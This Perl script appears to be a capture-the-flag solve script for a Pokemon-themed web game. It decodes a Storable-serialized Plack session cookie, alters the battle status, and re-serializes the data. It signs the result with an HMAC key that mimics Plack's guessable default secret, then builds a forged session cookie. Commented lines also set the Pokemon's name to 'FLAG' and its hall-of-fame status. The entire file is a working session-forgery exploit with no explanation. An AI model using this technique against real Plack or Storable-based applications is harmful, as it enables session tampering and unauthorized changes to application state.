#!/usr/bin/env perl

use strict;
use warnings;
use utf8;

use feature qw/say/;

use MIME::Base64;
use Storable;
use Digest::SHA qw(hmac_sha1_hex);
use Time::HiRes qw(gettimeofday);
use Data::Dumper;
use URI::Escape;

use Plack::Session;
use Digest::SHA1 ();

#my $org = "BQgDAAAAAA%3D%3D"; # $VAR1 = {}
#my $org = "BQgDAAAAAQQRBk1ld3R3bwMAAAANCJ4AAAAGYXR0YWNrCJ4AAAAHZGVmZW5zZQoGTWV3dHdvAAAABG5hbWUJAAABcAAAAAVtb25leQoGcHVycGxlAAAABWNvbG9yCIAAAAAKaGFsbG9mZmFtZQiCAAAABWxldmVsCPMAAAAGTUFYX0hQCJ4AAAAFc3BlZWQJAAAAlgAAAAJpZAoHUHN5Y2hpYwAAAAR0eXBlCNIAAAACSFAEAgAAAAAAAAAFaXRlbXMAAAAHcG9rZW1vbg%3D%3D";
my $org = "BQgDAAAAAgQDAAAAAgiBAAAABnN0YXR1cwQRBk1ld3R3bwMAAAANCQCYln8AAAAHZGVmZW5zZQkAmJZ%2FAAAABmF0dGFjawoGTWV3dHdvAAAABG5hbWUI7QAAAAVtb25leQiBAAAABWxldmVsCIAAAAAKaGFsbG9mZmFtZQoGcHVycGxlAAAABWNvbG9yCQCYln8AAAAGTUFYX0hQCQCYln8AAAAFc3BlZWQKB1BzeWNoaWMAAAAEdHlwZQkAAACWAAAAAmlkCQCYln8AAAACSFAEAgAAAAAAAAAFaXRlbXMAAAAFZW5lbXkAAAAGYmF0dGxlBBEISGl0b2thZ2UDAAAADQiNAAAAB2RlZmVuc2UIigAAAAZhdHRhY2sKCEhpdG9rYWdlAAAABG5hbWUJAAAA2AAAAAVtb25leQiBAAAABWxldmVsCIAAAAAKaGFsbG9mZmFtZQoDcmVkAAAABWNvbG9yCOwAAAAGTUFYX0hQCJIAAAAFc3BlZWQKBEZpcmUAAAAEdHlwZQiEAAAAAmlkCOwAAAACSFAEAgAAAAAAAAAFaXRlbXMAAAAHcG9rZW1vbg%3D%3D";
my $hashref = Storable::thaw(decode_base64(uri_unescape($org)));
say '$hashref = ' . Dumper $hashref;

#$hashref->{pokemon}->{name} = "FLAG";
#$hashref->{pokemon}->{halloffame} = 1;
$hashref->{battle}{status} = 5;

my $data = encode_base64(Storable::freeze($hashref), '');
say '$data = '. $data;

say Dumper Storable::thaw(decode_base64($data));

my $hash = hmac_sha1_hex(uri_escape($data), Digest::SHA1::sha1_hex(rand() . $$ . {} . time));
say '$hash = ' . $hash;

my ($epoch, $micro) = gettimeofday();
my $timekey = "$epoch.$micro";

my $session = $timekey . uri_escape(":$data:") . $hash;
say $session;
